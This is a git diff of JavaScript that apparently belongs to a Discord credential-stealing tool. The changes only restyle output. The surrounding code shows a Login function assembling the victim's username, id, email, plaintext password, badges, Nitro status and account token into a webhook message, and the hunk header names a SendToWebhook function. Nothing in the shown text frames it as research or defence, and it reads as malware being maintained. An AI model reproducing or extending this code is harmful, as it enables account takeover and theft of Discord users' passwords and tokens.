@@ -84,15 +84,15 @@ function SendToWebhook(what) {
 
 function GetNitro(flags) {
 	if (flags == 0) {
-		return "\`no nitro\`"
+		return "no nitro"
 	}
 	if (flags == 1) {
-		return "\`nitro classic\`"
+		return "nitro classic"
 	}
 	if (flags == 2) {
-		return "\`nitro boost\`"
+		return "nitro boost"
 	} else {
-		return "\`no nitro\`"
+		return "no nitro"
 	}
 }
 
@@ -166,7 +166,7 @@ function GetBadges(flags) {
 		badges += "verified bot developer "
 	}
 	if (badges == "") {
-		badges = "\`no badges\`"
+		badges = "no badges"
 	}
 	return badges
 }
@@ -192,12 +192,12 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": " name",
-			    "value": ` - ` + json.username + `#` + json.discriminator,
+			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
                             "inline": true
                         },
                         {
                             "name": " id",
-                            "value": ` - ` + json.id,
+                            "value": `\`` + json.id + `\``,
                             "inline": true
                         },
                         {
@@ -207,12 +207,12 @@ function Login(email, password, token) {
                         },
                         {
                             "name": " email",
-                            "value": ` - \`${email}\``,
+                            "value": `\`${email}\``,
                             "inline": true
                         },
                         {
                             "name": " password",
-                            "value": ` - \`${password}\``,
+                            "value": `\`${password}\``,
                             "inline": true		    
                         },
                         {
@@ -222,12 +222,12 @@ function Login(email, password, token) {
                         }, 
                         {
                             "name": " badges",
-                            "value": ` - ${GetBadges(json.flags)}`,
+                            "value": `\`${GetBadges(json.flags)}\``,
                             "inline": true		    
                         },
                         {
                             "name": " nitro",
-                            "value": ` - ${GetNitro(json.premium_type)}`,
+                            "value": `\`${GetNitro(json.premium_type)}\``,
                             "inline": true		    
                         },
                         {
@@ -237,7 +237,7 @@ function Login(email, password, token) {
                         }, 
                         {
                             "name": " token",
-                            "value": ` - \`${token}\``,
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
